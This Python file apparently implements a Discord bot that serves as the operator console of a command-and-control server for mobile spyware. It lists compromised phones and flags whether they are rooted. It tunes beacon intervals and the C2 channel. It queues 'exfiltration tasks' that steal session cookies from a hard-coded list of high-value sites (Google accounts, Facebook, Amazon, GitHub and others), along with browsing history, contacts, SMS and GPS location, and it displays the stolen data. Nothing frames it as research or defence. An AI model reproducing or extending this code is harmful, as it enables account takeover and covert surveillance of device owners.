"""
Discord bot entry point.
Uses slash commands (app_commands) with autocomplete for a better UX,
and logs every command invocation to the terminal for tracking.

Commands are forwarded to the C2 server via HTTP. If the server is
offline, the bot falls back to standalone/demo mode.
"""

import logging
from typing import Any

import discord
from discord import app_commands
from discord.ext import commands

import httpx

from config import (
    ADMIN_DISCORD_ID,
    C2_SERVER_URL,
    COMMAND_PREFIX,
    DISCORD_BOT_TOKEN,
    VALID_BEACON_INTERVALS,
    VALID_COMMUNICATION_PROTOCOLS,
)
from devices import DeviceManager

# ---------------------------------------------------------------------------
# Logging setup
# ---------------------------------------------------------------------------

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logger = logging.getLogger("discord-bot")

# ---------------------------------------------------------------------------
# Bot setup
# ---------------------------------------------------------------------------

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix=COMMAND_PREFIX, intents=intents)
device_manager = DeviceManager()

# ---------------------------------------------------------------------------
# Embed color palette
# ---------------------------------------------------------------------------

_COLOR_SUCCESS = 0x57F287  # green  — data present / online
_COLOR_ERROR = 0xED4245  # red    — failure / offline
_COLOR_INFO = 0x5865F2  # blurple — neutral info
_COLOR_NO_DATA = 0x99AAB5   # gray   — no data / unreachable

# ---------------------------------------------------------------------------
# Task emoji map
# ---------------------------------------------------------------------------

_TASK_EMOJIS: dict[str, str] = {
    "request-cookies":   "🍪",
    "request-history":   "📜",
    "request-bookmarks": "🔖",
    "request-contacts":  "👤",
    "request-sms":       "💬",
    "request-location":  "📍",
}

_HIGH_VALUE_COOKIE_DOMAINS = (
    "https://www.google.com,"
    "https://accounts.google.com,"
    "https://www.facebook.com,"
    "https://www.amazon.com,"
    "https://twitter.com,"
    "https://www.instagram.com,"
    "https://www.reddit.com,"
    "https://github.com,"
    "https://www.linkedin.com,"
    "https://www.netflix.com"
)

# ---------------------------------------------------------------------------
# HTTP bridge to C2 server
# ---------------------------------------------------------------------------


async def call_server(
    endpoint: str,
    method: str = "GET",
    json_body: dict[str, Any] | None = None,
) -> dict[str, Any] | None:
    """
    Call the C2 server via HTTP.
    Returns the response dict, or None if the server is unreachable.
    """
    url = f"{C2_SERVER_URL}{endpoint}"
    try:
        async with httpx.AsyncClient(timeout=10.0) as client:
            if method == "POST":
                resp = await client.post(url, json=json_body)
            else:
                resp = await client.get(url)

            if resp.status_code >= 400:
                logger.warning(
                    "Server returned %d for %s %s",
                    resp.status_code,
                    method,
                    endpoint,
                )
                return None

            logger.info("Server response from %s %s: OK", method, endpoint)
            return resp.json()
    except httpx.ConnectError:
        logger.warning(
            "Server unreachable at %s — running in standalone mode",
            C2_SERVER_URL,
        )
        return None
    except Exception as exc:
        logger.error("Error calling server: %s", exc)
        return None


# ---------------------------------------------------------------------------
# Embed formatters
# ---------------------------------------------------------------------------


def format_server_devices(data: dict[str, Any]) -> discord.Embed:
    """Format a /admin/devices response as a Discord embed."""
    devices = data.get("data", {}).get("devices", [])
    online_count = sum(1 for d in devices if d.get("status") == "online")

    if not devices:
        return discord.Embed(
            title="📡 Devices",
            description="No devices registered.",
            color=_COLOR_NO_DATA,
        )

    color = _COLOR_SUCCESS if online_count > 0 else _COLOR_ERROR
    embed = discord.Embed(
        title=f"📡 Devices — {online_count}/{len(devices)} online",
        color=color,
    )
    for d in devices:
        status = "🟢" if d.get("status") == "online" else "🔴"
        badges = (" 🤖" if d.get("is_emulator") else "") + (" 🔓" if d.get("is_rooted") else "")
        carrier = f" · {d['carrier']}" if d.get("carrier") else ""
        last_seen = (d.get("last_seen") or "")[:16].replace("T", " ")
        embed.add_field(
            name=f"{status} {d['name']}{badges}",
            value=f"`{d['ip']}`{carrier}\nlast seen `{last_seen}`",
            inline=True,
        )
    return embed


def format_cached_for_task(
    results_data: dict[str, Any] | None,
    task_type: str,
    device_filter: str = "*",
) -> discord.Embed:
    """Build a Discord embed with cached results for a given task type."""
    emoji = _TASK_EMOJIS.get(task_type, "📄")

    if results_data is None:
        return discord.Embed(
            title=f"{emoji} {task_type}",
            description="Server unreachable — no cached data.",
            color=_COLOR_NO_DATA,
        )

    results = results_data.get("data", {}).get("results_by_device", {})
    relevant: dict[str, Any] = {}
    for dev, dev_results in results.items():
        if device_filter not in ("*", dev):
            continue
        history = dev_results.get(task_type)
        if history:
            relevant[dev] = history[0]

    if not relevant:
        return discord.Embed(
            title=f"{emoji} {task_type}",
            description=f"No cached data yet for `{task_type}`.",
            color=_COLOR_NO_DATA,
        )

    embed = discord.Embed(title=f"{emoji} {task_type}", color=_COLOR_SUCCESS)
    for dev, latest in relevant.items():
        status_icon = "✅" if latest.get("success") else "❌"
        received = (latest.get("received_at") or "")[:16].replace("T", " ")
        output = str(latest.get("data", {}).get("output", ""))
        lines = output.split("\n")
        preview = "\n".join(lines[:8])[:800]
        if len(lines) > 8:
            preview += "\n…"
        embed.add_field(
            name=f"📱 {dev} {status_icon} · {received}",
            value=f"```\n{preview}\n```" if preview.strip() else "*empty*",
            inline=False,
        )
    return embed


def format_server_results(data: dict[str, Any]) -> discord.Embed:
    """Format a /admin/results response as a Discord embed."""
    results = data.get("data", {}).get("results_by_device", {})

    if not results:
        return discord.Embed(
            title="📊 Results",
            description=(
                "No task results stored yet. "
                "Queue a task and wait for the next beacon cycle."
            ),
            color=_COLOR_NO_DATA,
        )

    embed = discord.Embed(
        title=f"📊 {data.get('message', 'Task Results')}",
        color=_COLOR_INFO,
    )
    for device_name, device_results in results.items():
        lines = []
        for task_type, history in device_results.items():
            if not history:
                continue
            emoji = _TASK_EMOJIS.get(task_type, "📄")
            latest = history[0]
            status_icon = "✅" if latest.get("success") else "❌"
            received = (latest.get("received_at") or "")[:16].replace("T", " ")
            count_label = f" (+{len(history) - 1})" if len(history) > 1 else ""
            lines.append(f"{emoji} `{task_type}` {status_icon} `{received}`{count_label}")
        if lines:
            embed.add_field(
                name=f"📱 {device_name}",
                value="\n".join(lines),
                inline=False,
            )
    return embed


def format_server_simple(data: dict[str, Any]) -> discord.Embed:
    """Format a simple success/error response as a Discord embed."""
    status = data.get("status", "unknown")
    message = data.get("message", "")
    if status == "success":
        return discord.Embed(description=f"✅ {message}", color=_COLOR_SUCCESS)
    return discord.Embed(description=f"❌ {message}", color=_COLOR_ERROR)


def _wrap_standalone(text: str) -> discord.Embed:
    """Wrap a standalone/fallback text response in a neutral embed."""
    return discord.Embed(description=text, color=_COLOR_NO_DATA)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def is_admin_user(interaction: discord.Interaction) -> bool:
    """Check whether the interaction author is the authorised admin."""
    return interaction.user.id == ADMIN_DISCORD_ID


def log_command(
    interaction: discord.Interaction,
    command_name: str,
    args: str = "",
) -> None:
    """Log a command invocation to the terminal."""
    user = interaction.user
    guild = interaction.guild
    channel = interaction.channel

    guild_name = guild.name if guild else "DM"
    channel_name = getattr(channel, "name", "unknown")

    args_display = f" ({args})" if args else ""
    logger.info(
        "Command /%s%s executed by %s (ID: %s) in #%s @ %s",
        command_name,
        args_display,
        user,
        user.id,
        channel_name,
        guild_name,
    )


def log_access_denied(interaction: discord.Interaction, command_name: str) -> None:
    """Log a denied access attempt to the terminal."""
    user = interaction.user
    logger.warning(
        "ACCESS DENIED: /%s attempted by %s (ID: %s)",
        command_name,
        user,
        user.id,
    )


async def _handle_request_command(
    interaction: discord.Interaction,
    task_type: str,
    device: str,
    parameters: dict[str, Any] | None = None,
) -> None:
    """Shared handler for all /request-* commands: show cache + queue fresh task."""
    results = await call_server("/admin/results")
    embed = format_cached_for_task(results, task_type, device)

    queue_response = await call_server(
        "/admin/queue-task",
        method="POST",
        json_body={
            "device_name": device,
            "task_type": task_type,
            "parameters": parameters or {},
        },
    )

    target = "all devices" if device == "*" else device
    if queue_response and queue_response.get("status") == "success":
        footer = f"📡 Fresh task queued for {target} · re-run after next beacon"
    elif queue_response is None:
        footer = "❌ Could not queue — server unreachable"
    else:
        footer = f"❌ Queue failed — {queue_response.get('message', 'unknown error')}"

    embed.set_footer(text=footer)
    await interaction.response.send_message(embed=embed)


# ---------------------------------------------------------------------------
# Events
# ---------------------------------------------------------------------------

@bot.event
async def on_ready() -> None:
    """Sync slash commands and log when the bot connects."""
    try:
        synced = await bot.tree.sync()
        logger.info(
            "Bot connected as %s (ID: %s) — synced %d slash command(s)",
            bot.user,
            bot.user.id,  # type: ignore[union-attr]
            len(synced),
        )
    except Exception as e:
        logger.error("Failed to sync commands: %s", e)

    health = await call_server("/health")
    if health:
        logger.info("C2 server is reachable — server bridge active")
    else:
        logger.warning("C2 server is not reachable — standalone mode")

    logger.info("Waiting for commands...")


# ---------------------------------------------------------------------------
# Autocomplete callbacks
# ---------------------------------------------------------------------------

async def beacon_interval_autocomplete(
    interaction: discord.Interaction,
    current: str,
) -> list[app_commands.Choice[int]]:
    """Provide autocomplete options for beacon interval values."""
    return [
        app_commands.Choice(name=f"{val} seconds", value=val)
        for val in VALID_BEACON_INTERVALS
        if current == "" or str(val).startswith(current)
    ]


async def protocol_autocomplete(
    interaction: discord.Interaction,
    current: str,
) -> list[app_commands.Choice[str]]:
    """Provide autocomplete options for communication protocols."""
    return [
        app_commands.Choice(name=proto, value=proto)
        for proto in VALID_COMMUNICATION_PROTOCOLS
        if current == "" or proto.startswith(current.lower())
    ]


# ---------------------------------------------------------------------------
# Slash Commands
# ---------------------------------------------------------------------------

@bot.tree.command(
    name="show-devices",
    description="Display all managed devices and their status.",
)
async def show_devices(interaction: discord.Interaction) -> None:
    """Send the list of managed devices to the channel."""
    if not is_admin_user(interaction):
        log_access_denied(interaction, "show-devices")
        await interaction.response.send_message(
            "🚫 **Access denied.** You are not authorised to use this bot.",
            ephemeral=True,
        )
        return

    log_command(interaction, "show-devices")

    server_response = await call_server("/admin/devices")
    if server_response:
        embed = format_server_devices(server_response)
    else:
        embed = _wrap_standalone(device_manager.show_devices())

    await interaction.response.send_message(embed=embed)


@bot.tree.command(
    name="device-info",
    description="Show full fingerprint details for a specific device.",
)
@app_commands.describe(device="Device name (e.g. POCO_F5)")
async def device_info(interaction: discord.Interaction, device: str) -> None:
    """Display rich fingerprint data for the requested device."""
    if not is_admin_user(interaction):
        log_access_denied(interaction, "device-info")
        await interaction.response.send_message(
            "🚫 **Access denied.** You are not authorised to use this bot.",
            ephemeral=True,
        )
        return

    log_command(interaction, "device-info", f"device={device}")

    server_response = await call_server(f"/admin/device-info/{device}")
    if server_response:
        d = server_response.get("data", {})
        is_online = d.get("status") == "online"
        badges = (" 🤖" if d.get("is_emulator") else "") + (" 🔓" if d.get("is_rooted") else "")
        embed = discord.Embed(
            title=f"📱 {d.get('name')}{badges}",
            color=_COLOR_SUCCESS if is_online else _COLOR_ERROR,
        )
        status_val = f"{'🟢' if is_online else '🔴'} {d.get('status')}"
        embed.add_field(name="Status", value=status_val, inline=True)
        embed.add_field(name="IP", value=f"`{d.get('ip')}`", inline=True)
        embed.add_field(name="OS", value=f"`{d.get('os_info', 'unknown')}`", inline=True)
        embed.add_field(name="Carrier", value=f"`{d.get('carrier', 'unknown')}`", inline=True)
        embed.add_field(name="Apps", value=f"`{d.get('installed_apps_count', 0)}`", inline=True)
        last_seen = (d.get("last_seen") or "")[:16].replace("T", " ")
        embed.add_field(name="Last seen", value=f"`{last_seen}`", inline=True)
    else:
        embed = discord.Embed(
            description=f"❌ Could not retrieve device info for `{device}`.",
            color=_COLOR_ERROR,
        )

    await interaction.response.send_message(embed=embed)


@bot.tree.command(
    name="set-beacon-interval",
    description="Set the beacon interval. Valid values: 15, 30, 60, 120.",
)
@app_commands.autocomplete(interval=beacon_interval_autocomplete)
@app_commands.describe(interval="Beacon interval in seconds (15, 30, 60, or 120)")
async def set_beacon_interval(
    interaction: discord.Interaction,
    interval: int,
) -> None:
    """Set the beacon interval to the provided value."""
    if not is_admin_user(interaction):
        log_access_denied(interaction, "set-beacon-interval")
        await interaction.response.send_message(
            "🚫 **Access denied.** You are not authorised to use this bot.",
            ephemeral=True,
        )
        return

    log_command(interaction, "set-beacon-interval", f"interval={interval}")

    server_response = await call_server(
        "/admin/beacon-interval", method="POST", json_body={"interval": interval}
    )
    if server_response:
        embed = format_server_simple(server_response)
    else:
        embed = _wrap_standalone(device_manager.set_beacon_interval(interval))

    await interaction.response.send_message(embed=embed)


@bot.tree.command(
    name="set-communication-protocol",
    description="Set the communication protocol. Valid: http, https, dns.",
)
@app_commands.autocomplete(protocol=protocol_autocomplete)
@app_commands.describe(protocol="Protocol to use (http, https, or dns)")
async def set_communication_protocol(
    interaction: discord.Interaction,
    protocol: str,
) -> None:
    """Set the communication protocol to the provided value."""
    if not is_admin_user(interaction):
        log_access_denied(interaction, "set-communication-protocol")
        await interaction.response.send_message(
            "🚫 **Access denied.** You are not authorised to use this bot.",
            ephemeral=True,
        )
        return

    log_command(interaction, "set-communication-protocol", f"protocol={protocol}")

    server_response = await call_server(
        "/admin/communication-protocol",
        method="POST",
        json_body={"protocol": protocol},
    )
    if server_response:
        embed = format_server_simple(server_response)
    else:
        embed = _wrap_standalone(device_manager.set_communication_protocol(protocol))

    await interaction.response.send_message(embed=embed)


@bot.tree.command(
    name="request-cookies",
    description="Show cached cookies and queue a fresh cookie request.",
)
@app_commands.describe(device="Target device name (or '*' for all devices)")
async def request_cookies(
    interaction: discord.Interaction,
    device: str = "*",
) -> None:
    """Show cached cookies and queue a fresh exfiltration task."""
    if not is_admin_user(interaction):
        log_access_denied(interaction, "request-cookies")
        await interaction.response.send_message(
            "🚫 **Access denied.** You are not authorised to use this bot.",
            ephemeral=True,
        )
        return
    log_command(interaction, "request-cookies", f"device={device}")
    await _handle_request_command(
        interaction, "request-cookies", device, {"domains": _HIGH_VALUE_COOKIE_DOMAINS}
    )


@bot.tree.command(
    name="request-history",
    description="Show cached history and queue a fresh request.",
)
@app_commands.describe(device="Target device name (or '*' for all devices)")
async def request_history(
    interaction: discord.Interaction,
    device: str = "*",
) -> None:
    """Show cached history and queue a fresh exfiltration task."""
    if not is_admin_user(interaction):
        log_access_denied(interaction, "request-history")
        await interaction.response.send_message(
            "🚫 **Access denied.** You are not authorised to use this bot.",
            ephemeral=True,
        )
        return
    log_command(interaction, "request-history", f"device={device}")
    await _handle_request_command(interaction, "request-history", device)


@bot.tree.command(
    name="request-bookmarks",
    description="Show cached bookmarks and queue a fresh request.",
)
@app_commands.describe(device="Target device name (or '*' for all devices)")
async def request_bookmarks(
    interaction: discord.Interaction,
    device: str = "*",
) -> None:
    """Show cached bookmarks and queue a fresh exfiltration task."""
    if not is_admin_user(interaction):
        log_access_denied(interaction, "request-bookmarks")
        await interaction.response.send_message(
            "🚫 **Access denied.** You are not authorised to use this bot.",
            ephemeral=True,
        )
        return
    log_command(interaction, "request-bookmarks", f"device={device}")
    await _handle_request_command(interaction, "request-bookmarks", device)


@bot.tree.command(
    name="request-sms",
    description="Show cached SMS and queue a fresh request.",
)
@app_commands.describe(device="Target device name (or '*' for all devices)")
async def request_sms(
    interaction: discord.Interaction,
    device: str = "*",
) -> None:
    """Show cached SMS and queue a fresh exfiltration task. Requires READ_SMS on device."""
    if not is_admin_user(interaction):
        log_access_denied(interaction, "request-sms")
        await interaction.response.send_message(
            "🚫 **Access denied.** You are not authorised to use this bot.",
            ephemeral=True,
        )
        return
    log_command(interaction, "request-sms", f"device={device}")
    await _handle_request_command(interaction, "request-sms", device)


@bot.tree.command(
    name="request-location",
    description="Show cached GPS location and queue a fresh request.",
)
@app_commands.describe(device="Target device name (or '*' for all devices)")
async def request_location(
    interaction: discord.Interaction,
    device: str = "*",
) -> None:
    """Show cached location and queue a fresh poll (cached GPS fix, no active tracking)."""
    if not is_admin_user(interaction):
        log_access_denied(interaction, "request-location")
        await interaction.response.send_message(
            "🚫 **Access denied.** You are not authorised to use this bot.",
            ephemeral=True,
        )
        return
    log_command(interaction, "request-location", f"device={device}")
    await _handle_request_command(interaction, "request-location", device)


@bot.tree.command(
    name="request-contacts",
    description="Show cached contacts and queue a fresh request.",
)
@app_commands.describe(device="Target device name (or '*' for all devices)")
async def request_contacts(
    interaction: discord.Interaction,
    device: str = "*",
) -> None:
    """Show cached contacts and queue a fresh exfiltration task. Requires READ_CONTACTS."""
    if not is_admin_user(interaction):
        log_access_denied(interaction, "request-contacts")
        await interaction.response.send_message(
            "🚫 **Access denied.** You are not authorised to use this bot.",
            ephemeral=True,
        )
        return
    log_command(interaction, "request-contacts", f"device={device}")
    await _handle_request_command(interaction, "request-contacts", device)


# ---------------------------------------------------------------------------
# Task queue autocomplete
# ---------------------------------------------------------------------------

VALID_TASK_TYPES = [
    "request-cookies",
    "request-history",
    "request-bookmarks",
    "request-contacts",
    "request-sms",
    "request-location",
]


async def task_type_autocomplete(
    interaction: discord.Interaction,
    current: str,
) -> list[app_commands.Choice[str]]:
    """Provide autocomplete options for task types."""
    return [
        app_commands.Choice(name=t, value=t)
        for t in VALID_TASK_TYPES
        if current == "" or t.startswith(current.lower())
    ]


async def device_name_autocomplete(
    interaction: discord.Interaction,
    current: str,
) -> list[app_commands.Choice[str]]:
    """Provide autocomplete options for device names (fetched from server)."""
    choices = [app_commands.Choice(name="* (all devices)", value="*")]
    server_response = await call_server("/admin/devices")
    if server_response:
        devices = server_response.get("data", {}).get("devices", [])
        for d in devices:
            name = d["name"]
            if current == "" or name.startswith(current.lower()):
                choices.append(app_commands.Choice(name=name, value=name))
    return choices[:25]


# ---------------------------------------------------------------------------
# Task queue commands
# ---------------------------------------------------------------------------

@bot.tree.command(
    name="queue-task",
    description="Queue a task for a device. Use '*' for all devices.",
)
@app_commands.autocomplete(device=device_name_autocomplete, task_type=task_type_autocomplete)
@app_commands.describe(
    device="Target device name (or '*' for all devices)",
    task_type="Type of task to queue",
    parameters="Optional JSON parameters for the task",
)
async def queue_task(
    interaction: discord.Interaction,
    device: str,
    task_type: str,
    parameters: str = "{}",
) -> None:
    """Queue a C2 task for a target device via the server."""
    if not is_admin_user(interaction):
        log_access_denied(interaction, "queue-task")
        await interaction.response.send_message(
            "🚫 **Access denied.** You are not authorised to use this bot.",
            ephemeral=True,
        )
        return

    log_command(interaction, "queue-task", f"device={device}, type={task_type}")

    import json
    try:
        params = json.loads(parameters)
    except json.JSONDecodeError:
        await interaction.response.send_message(
            "❌ Invalid JSON in parameters. Example: `{\"domains\": \"google.com\"}`",
            ephemeral=True,
        )
        return

    server_response = await call_server(
        "/admin/queue-task",
        method="POST",
        json_body={
            "device_name": device,
            "task_type": task_type,
            "parameters": params,
        },
    )
    if server_response:
        embed = format_server_simple(server_response)
    else:
        embed = discord.Embed(
            description="❌ Server unreachable — cannot queue tasks in standalone mode.",
            color=_COLOR_ERROR,
        )

    await interaction.response.send_message(embed=embed)


@bot.tree.command(
    name="show-results",
    description="Show the latest exfiltrated data for all devices.",
)
async def show_results(interaction: discord.Interaction) -> None:
    """Display the most recent task result per type per device."""
    if not is_admin_user(interaction):
        log_access_denied(interaction, "show-results")
        await interaction.response.send_message(
            "🚫 **Access denied.** You are not authorised to use this bot.",
            ephemeral=True,
        )
        return

    log_command(interaction, "show-results")

    server_response = await call_server("/admin/results")
    if server_response:
        embed = format_server_results(server_response)
    else:
        embed = discord.Embed(
            description="❌ Server unreachable — cannot retrieve results.",
            color=_COLOR_ERROR,
        )

    await interaction.response.send_message(embed=embed)


@bot.tree.command(
    name="pending-tasks",
    description="Show all pending tasks across all devices.",
)
async def pending_tasks(interaction: discord.Interaction) -> None:
    """Show pending task counts per device."""
    if not is_admin_user(interaction):
        log_access_denied(interaction, "pending-tasks")
        await interaction.response.send_message(
            "🚫 **Access denied.** You are not authorised to use this bot.",
            ephemeral=True,
        )
        return

    log_command(interaction, "pending-tasks")

    server_response = await call_server("/admin/pending-tasks")
    if server_response:
        pending = server_response.get("data", {}).get("pending_by_device", {})
        if not pending:
            embed = discord.Embed(description="✅ No pending tasks.", color=_COLOR_SUCCESS)
        else:
            embed = discord.Embed(title="📋 Pending Tasks", color=_COLOR_INFO)
            for dev, count in pending.items():
                embed.add_field(name=f"📱 {dev}", value=f"{count} task(s)", inline=True)
    else:
        embed = discord.Embed(
            description="❌ Server unreachable — cannot check pending tasks.",
            color=_COLOR_ERROR,
        )

    await interaction.response.send_message(embed=embed)


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    bot.run(DISCORD_BOT_TOKEN)
